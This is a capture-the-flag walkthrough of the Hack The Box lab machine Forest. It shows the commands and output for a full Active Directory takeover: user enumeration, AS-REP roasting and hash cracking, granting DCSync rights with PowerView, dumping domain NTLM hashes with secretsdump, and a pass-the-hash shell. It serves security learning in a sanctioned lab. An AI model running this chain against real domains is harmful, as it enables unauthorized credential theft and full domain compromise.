# Hack The Box - Forest 10.10.10.161 

![d1aaf78acb7d040e3b944157f8cbc763.png](_resources/4042edcb43b849ea93629a3d233802d7.png)

Forest was the first machine that I was trying to own when I first joined Hack The Box. It was an overall easy to medium difficulty machine (I personally would rate it medium). 

Anonymous logon/null session is the first attack vector to this box that allows me to enumerate users which later used to do [AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) attack against Kerberos and obtains the TGT of a service account. For the root part, I'll leverage the user permission to grant myself a DCsync rights and abuse it to dump NTLM hashes.

# Reconnaissance
As always, I'll start with port scanning using nmap

## Nmap

```
root@iamf:~# nmap -sV -sC -oA -v initial-forest 10.10.10.171
```

- -sC, to scan with default script
- -sV, to scan service version
- -oA, to save the output to all format (xml, nmap, gnmap)
- -v, to verbose during the scan.

```
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.16s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 08:18:45Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E75CC69%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m25s, deviation: 4h02m30s, median: 6m24s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-03-21T01:21:11-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-21T08:21:14
|_  start_date: 2020-03-20T05:27:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

From the scan results, [It is likely](https://isc.sans.edu/diary/Cyber+Security+Awareness+Month+-+Day+27+-+Active+Directory+Ports/7468) I'm dealing with a domain controller of an Active Directory system.

When it comes to an Active Directory, I often to see people begin their enumeration from SMB(445), RPC(139&445) and sometimes LDAP(389). I'll also follow that sequence because these three ports most likely allow anonymous login.

## TCP 445 - SMB / RPC over SMB

I can login anonymously via both `smbclient` and `rpcclient`.

However, I could enumerate users and groups over RPC using `rpcclient`. 


```text
$ rpcclient -U '%' 10.10.10.161
rpcclient $> enumdomusers              
user:[Administrator] rid:[0x1f4]       
user:[Guest] rid:[0x1f5]               
user:[krbtgt] rid:[0x1f6]              
user:[DefaultAccount] rid:[0x1f7]      
... <omitted> ...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]                
user:[santi] rid:[0x480]
```

I use this blog post from [SANS](https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/) as my reference.

# Initial Access

## Shell as svc-alfresco

In Active Directory, if a user by any chances has Kerberos pre-authentication disabled then I can obtain that user's TGT. (you can read more about it [here](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/))

Below are the overview of Kerberos mechanism. The red circle is where the AS-REP Roasting attack happened.

![1c8adf13109de9cc575c53d4eb659467.png](_resources/55e839a7e034457a922add499992970d.png)
<small>Taken from "Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System" by David Freimanis</small>


I'll use the impacket tool `GetNPUsers.py` to initiate a TGT request (AS-REQ) for every user from my RPC enumeration above to the DC. If the users has pre-auth disabled then the DC will returns their TGT (AS-REP).
```
root@iamf:~/htb/boxes/forest# GetNPUsers.py -dc-ip htb.forest -request htb.local/  -usersfile users -format hashcat
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-03-26 09:40:41.035829  2020-03-26 09:41:40.077493  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a
```

The obtained hash can be cracked offline (I'm using Windows for cracking)
```
hashcat64.exe -m 18200 svcalfresco.txt rockyou.txt -O
```
![3fa7dc6810434503007549f8610016fa.png](_resources/54b3a7dbe1c644a98c00a8458e2723ff.png)

User svc-alfresco can login remotely. In this case I'll use `evil-winrm`.

```
root@iamf:~# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

User flag is done here.

# Privilege Escalation
## Shell as Administrator

With user svc-alfresco, I couldn't find a vulnerable app or services in this machine because of this I'll use [BloodHound](https://bloodhound.readthedocs.io/en/latest/index.html) (I still can't believe it's a free and open source tool) to gather more information and find objects relationship within this Active Directory.

First, I'll host my own shares using `smbserver.py` from Impacket. This will make exfil and data clean up easier.
```text
root@iamf:~/htb/boxes/forest# mkdir shares; 
root@iamf:~/htb/boxes/forest# cd shares/
root@iamf:~/htb/boxes/forest# smbserver.py myfj . -smb2support -username iamf -password iamf
``` 

Now I'll just let the Forest machine connect to my shares.
```
*Evil-WinRM* PS C:\> $pass = ConvertTo-SecureString 'belompi' -AsPlainText -Force
*Evil-WinRM* PS C:\> $cred = New-Object System.management.automation.pscredential('mikun', $pass)
*Evil-WinRM* PS C:\> New-PSDrive -Name mikun -PSProvider FileSystem -Credential $cred -Root \\[tun0ip]\myfj
*Evil-WinRM* PS C:\> cd mikun:
```

I've already put the BloodHound Ingestor, `SharpHound.exe`, inside my shares.

![4da2b821c626eeaa85eecea39b4c96d7.png](_resources/80def241b823454fa383ea4c1caabc48.png)

I can just run the ingestor now 
![79cb63de9a27f691e28d80820db1ad3d.png](_resources/acfc9f4b0e234e03824e901be6c9bae0.png)

After it finished, I'll run the BloodHound GUI and load the collected data by drag and drop.
```
root@iamf:~/htb/boxes/forest# neo4j console
<==splitted pane==>
root@iamf:~/htb/boxes/forest# bloodhound --no-sandbox
```

I'll mark the svc-alfresco as owned then use the BloodHound Pre-Built Analytics Queries "Shortest Path from Owned Principal".

![210d3c3d6e83c6abadd56212b588b7b0.png](_resources/2506f5fa02894bd2b3d1095de0c87dcb.png)

Path explanation, from top to the bottom:
- Exchange Windows Permissions group has `WriteDacl` permission to the AD domain, it simply allows you to modify the domain objects permission. Users, groups, computers, shares is a domain object.
- Account Operators group has `GenericAll` permissions to the Exchange Windows Permission group, it allows you to modify group membership like adding a user to the group. The Account Operators itself has an ability to create a user.
- Privileged IT group has a direct membership of Account Operators group.
- User svc-alfresco is a direct member of Service Account group and it has an indirect membership of Privileged IT Account and Account Operators group

Based on the path, here is the plan:
- Leverage the Account Operators indirect membership to create a new user and join it to the Exchange Windows Permission group
- Leverage the Exchange Windows Permission group permission to grant `DS-Replication-Get-Changes-All` (DCSync) to the new user.


Plan Execution:

In Forest, I'll load [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) first. 

```
*Evil-WinRM* PS mikun:\> Import-Module .\powerview.ps1
```

Create a new user and join it to the Exchange Windows Permission group.
```
*Evil-WinRM* PS mikun:\> net user mikun password /add /domain
*Evil-WinRM* PS mikun:\> net group "Exchange Windows Permission" /add mikun
```

Then, grant the user a DCSync rights
```
*Evil-WinRM* PS mikun:\> $pass = ConvertTo-SecureString 'password' -AsPlainText -Force
*Evil-WinRM* PS mikun:\> $cred = New-Object System.management.automation.pscredential('mikun', $pass)
*Evil-WinRM* PS mikun:\> $cred 
*Evil-WinRM* PS mikun:\> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity mikun -Rights DCSync
```

Now, I'll use `secretsdump.py` from impacket to perform a DCSync attack.

```
root@iamf:~# secretsdump.py htb.local/mikun:'password'@10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
.... <omitted> .....
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
.... <omitted> .....
[*] Cleaning up... 
```

To get the shell, I  use `psexec.py` from impacket to perform a pass-the-hash attack.

```
root@iamf:~# psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

![f5aa475536c65192d37a0278a77646ee.png](_resources/5a2108e444d24cdaa30025943db72b72.png)

Root flag is done here and that's all, hope it is helpful!